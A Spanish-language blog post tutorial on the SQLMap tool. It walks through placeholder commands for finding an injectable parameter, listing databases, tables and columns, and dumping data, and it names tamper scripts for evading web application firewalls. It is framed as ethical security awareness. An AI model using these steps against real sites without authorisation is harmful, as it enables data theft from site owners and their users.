SQLMap

Mouad Tenbihi 09/09/2020
Volver a Noticias

¿Para qué sirve SQLMap?

SQLMap es una herramienta desarrollada en Python que sirve para detectar y explotar vulnerabilidades de inyección SQL en distintos motores de bases de datos como MySQL, Oracle o PostgreSQL. Se usa para poner a prueba la seguridad de páginas web siempre con fines éticos.

Viene preinstalado en algunas distribuciones Linux como Kali Linux y es compatible con Windows siempre que tenga Python instalado.

¿Cómo se utiliza?

El comando básico es:

sqlmap -u "URL_a_testear" --dbs

Primero hay que encontrar una URL con parámetros inyectables (del tipo producto.php?id=1). Podemos verificar si es inyectable añadiendo una comilla simple ' al final: si devuelve error, puede ser vulnerable.

Proceso de explotación (5 pasos)

1. Detectar el motor de base de datos:

sqlmap -u "URL"

2. Listar las bases de datos:

sqlmap -u "URL" --dbs

3. Listar las tablas de una base de datos:

sqlmap -u "URL" -D nombre_base --tables

4. Ver las columnas de una tabla:

sqlmap -u "URL" -D nombre_base -T nombre_tabla --columns

5. Extraer los datos:

sqlmap -u "URL" -D nombre_base -T nombre_tabla -C nombre_columna --dump

¿Qué es un WAF y cómo se evade?

Un WAF (Web Application Firewall) protege el servidor analizando peticiones HTTP/HTTPS antes de que lleguen a la aplicación. SQLMap incluye tampers para intentar evadir los WAF mediante técnicas de ofuscación:

  • space2comment — reemplaza espacios por /**/
  • charencode.py — codifica caracteres en su representación numérica

No obstante, los tampers no siempre logran evadir los WAF: depende de la fortaleza de su configuración.

Conclusión

Con SQLMap es posible demostrar en 5 pasos la poca seguridad que tienen muchas páginas web. Su objetivo es concienciar sobre la importancia de una programación correcta en las llamadas a la base de datos.
